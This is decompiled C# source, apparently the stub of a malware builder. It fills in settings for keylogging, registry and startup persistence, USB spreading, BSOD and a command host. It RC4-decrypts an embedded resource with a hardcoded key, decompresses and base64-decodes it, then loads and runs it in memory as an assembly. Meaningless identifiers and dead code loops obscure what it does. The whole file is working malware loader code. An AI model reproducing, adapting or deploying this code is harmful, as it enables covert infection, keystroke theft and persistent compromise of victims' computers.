using System;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Text;
using System.Windows.Forms;
using MicrosoftCopy.Properties;

namespace scrcext;

internal static class kjhgghjkhbhjgvbjhbhjb
{
	private class kjnknkjnnnnn
	{
		public kjnknkjnnnnn(Assembly njknklnmlk, string[] njknkjnkln)
		{
			object o = njknklnmlk.CreateInstance(njknklnmlk.EntryPoint!.Name);
			new jhjgbjhbjh(o, njknkjnkln, njknklnmlk);
		}
	}

	private class jhjgbjhbjh
	{
		public jhjgbjhbjh(object o, string[] ar, Assembly c)
		{
			c.EntryPoint!.Invoke(o, new object[1] { ar });
		}
	}

	public static bool asd = Convert.ToBoolean("%fixed%");

	public static bool fixedMemory = Convert.ToBoolean("%fixedmemory%");

	public static bool fixedR = Convert.ToBoolean("%fixedregstary%");

	public static bool startupfixedR = Convert.ToBoolean("%fixedstartup%");

	public static string asdasd = "%Mesgbo1%";

	public static string Messgebox2 = "%Messagebox2%";

	public static bool KeyLogger = Convert.ToBoolean("%KLENABEL%");

	public static bool EncrpionFile = Convert.ToBoolean("%klencode%");

	public static bool WriteFileKeylgger = Convert.ToBoolean("%klfile%");

	public static bool Regstary = Convert.ToBoolean("%regeditStartUp%");

	public static bool sankdnals = Convert.ToBoolean("%CopyToAnyFoldarrrr%");

	public static bool CopyToStartUp = Convert.ToBoolean("%CopyToStartUp%");

	public static bool BD = Convert.ToBoolean("%bsod%");

	public static string DR = "%dir%";

	public static string EXE = "%exe%";

	public static string H = "%host%";

	public static string P = "";

	public static string RG = "%rg%";

	public static bool SPR = Convert.ToBoolean("%usb%");

	public static string VN = "%vn%";

	public static string VR = "0.5.5";

	public static string fdsjkfsdkfs = "%Bypass%";

	public static string salkmdlkamsdlk = "%Run_after_time%";

	public static string Y = "^";

	public static string dasdasdas = "";

	private static void Main()
	{
		object obj = dasdasdas;
		dasdasdas = string.Concat(obj, asd.ToString(), Y, fixedMemory, Y, fixedR, Y, startupfixedR, Y);
		string text = dasdasdas;
		dasdasdas = text + asdasd + Y + Messgebox2 + Y;
		object obj2 = dasdasdas;
		dasdasdas = string.Concat(obj2, KeyLogger, Y, EncrpionFile, Y, WriteFileKeylgger, Y);
		object obj3 = dasdasdas;
		dasdasdas = string.Concat(obj3, Regstary, Y, sankdnals, Y, CopyToStartUp, Y);
		dasdasdas = dasdasdas + BD + Y;
		string text2 = dasdasdas;
		dasdasdas = text2 + DR + Y + EXE + Y + H + Y + P + Y + RG + Y;
		object obj4 = dasdasdas;
		dasdasdas = string.Concat(obj4, SPR, Y, VN, Y, VR, Y, fdsjkfsdkfs, Y, salkmdlkamsdlk);
		string[] njknkjnkln = new string[1] { dasdasdas };
		byte[] i = Resources.i3;
		i = ooooooooooooooooosadasdsdwwwww(i, "syria");
		i = fsdfsdfdddddddddddddd(i);
		string s = byterostring(i);
		Assembly njknklnmlk = Assembly.Load(Convert.FromBase64String(s));
		new kjnknkjnnnnn(njknklnmlk, njknkjnkln);
	}

	public static string byterostring(byte[] dcasdadawaaaaaaaaaaa)
	{
		//IL_0009: Unknown result type (might be due to invalid IL or missing references)
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0035: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Unknown result type (might be due to invalid IL or missing references)
		//IL_004b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0056: Unknown result type (might be due to invalid IL or missing references)
		for (int i = 0; i < -1; i++)
		{
			MessageBox.Show("");
			MessageBox.Show("");
			MessageBox.Show("");
			MessageBox.Show("");
			MessageBox.Show("");
			MessageBox.Show("");
			MessageBox.Show("");
			MessageBox.Show("");
		}
		return Encoding.UTF8.GetString(dcasdadawaaaaaaaaaaa);
	}

	public static byte[] ooooooooooooooooosadasdsdwwwww(byte[] njnkl, string kjnjkn)
	{
		byte[] bytes = Encoding.ASCII.GetBytes(kjnjkn);
		byte[] array = new byte[256];
		byte[] array2 = new byte[256];
		int i;
		for (i = 0; i < 256; i++)
		{
			array[i] = (byte)i;
			array2[i] = bytes[i % bytes.GetLength(0)];
		}
		int num = 0;
		for (i = 0; i < 256; i++)
		{
			num = (num + array[i] + array2[i]) % 256;
			byte b = array[i];
			array[i] = array[num];
			array[num] = b;
		}
		num = 0;
		i = 0;
		for (int j = 0; j < njnkl.GetLength(0); j++)
		{
			i = (i + 1) % 256;
			num = (num + array[i]) % 256;
			byte b = array[i];
			array[i] = array[num];
			array[num] = b;
			int num2 = (array[i] + array[num]) % 256;
			njnkl[j] ^= array[num2];
		}
		return njnkl;
	}

	public static void CopyTo(Stream src, Stream dest)
	{
		//IL_0009: Unknown result type (might be due to invalid IL or missing references)
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0035: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Unknown result type (might be due to invalid IL or missing references)
		//IL_004b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0056: Unknown result type (might be due to invalid IL or missing references)
		//IL_0078: Unknown result type (might be due to invalid IL or missing references)
		//IL_0083: Unknown result type (might be due to invalid IL or missing references)
		//IL_008e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0099: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00af: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c5: Unknown result type (might be due to invalid IL or missing references)
		for (int i = 0; i < -1; i++)
		{
			MessageBox.Show("");
			MessageBox.Show("");
			MessageBox.Show("");
			MessageBox.Show("");
			MessageBox.Show("");
			MessageBox.Show("");
			MessageBox.Show("");
			MessageBox.Show("");
		}
		byte[] array = new byte[4096];
		for (int j = 0; j < -1; j++)
		{
			MessageBox.Show("");
			MessageBox.Show("");
			MessageBox.Show("");
			MessageBox.Show("");
			MessageBox.Show("");
			MessageBox.Show("");
			MessageBox.Show("");
			MessageBox.Show("");
		}
		int num = 0;
		try
		{
			while ((num = src.Read(array, 0, array.Length)) != 0)
			{
				dest.Write(array, 0, num);
			}
		}
		catch
		{
		}
	}

	public static byte[] Zip(byte[] str)
	{
		//IL_0025: Unknown result type (might be due to invalid IL or missing references)
		//IL_0030: Unknown result type (might be due to invalid IL or missing references)
		//IL_003b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0046: Unknown result type (might be due to invalid IL or missing references)
		//IL_0051: Unknown result type (might be due to invalid IL or missing references)
		//IL_005c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0067: Unknown result type (might be due to invalid IL or missing references)
		//IL_0072: Unknown result type (might be due to invalid IL or missing references)
		using MemoryStream src = new MemoryStream(str);
		using MemoryStream memoryStream = new MemoryStream();
		using (GZipStream dest = new GZipStream(memoryStream, CompressionMode.Compress))
		{
			CopyTo(src, dest);
			for (int i = 0; i < -1; i++)
			{
				MessageBox.Show("");
				MessageBox.Show("");
				MessageBox.Show("");
				MessageBox.Show("");
				MessageBox.Show("");
				MessageBox.Show("");
				MessageBox.Show("");
				MessageBox.Show("");
			}
		}
		return memoryStream.ToArray();
	}

	public static byte[] fsdfsdfdddddddddddddd(byte[] bytes)
	{
		MemoryStream stream = new MemoryStream(bytes);
		using MemoryStream memoryStream = new MemoryStream();
		using (GZipStream src = new GZipStream(stream, CompressionMode.Decompress))
		{
			CopyTo(src, memoryStream);
		}
		return memoryStream.ToArray();
	}
}
